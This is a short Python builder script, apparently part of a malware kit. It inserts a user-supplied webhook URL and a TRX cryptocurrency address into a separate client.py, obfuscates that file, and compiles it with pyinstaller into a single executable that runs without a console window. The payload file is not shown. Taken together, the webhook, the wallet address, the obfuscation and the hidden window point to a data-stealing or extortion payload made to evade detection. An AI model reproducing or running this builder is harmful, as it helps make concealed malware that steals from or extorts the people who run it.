import uuid
import base64
import hashlib
import os 
import pyImpossibleObf

key ="loooood"
webhook = input("Webhook : ")
trxaddress = input("TRX Address (enter for default, and support me btw) :")
if trxaddress == "":
	trxaddress = "TT9CxzPs846UQ2F5zxwmPuqHV115ETvs4d"
filecontent = open("client.py", "r").read()
filecontent = filecontent.replace("webhook667", webhook).replace("TRX:TT9CxzPs846UQ2F5zxwmPuqHV115ETvs4d", "TRX:" + trxaddress )
open("client.py", "w",encoding="utf-8").write(str(filecontent))
print("[.] Replaced variables in file.")

val = input("Do you use py, python or python3 filename.py to launch file? (py/python/python3) : ")

os.system(val + " hash.py")

os.system('pyinstaller --onefile --noconsole client.py.hashed.py -i "NONE"')
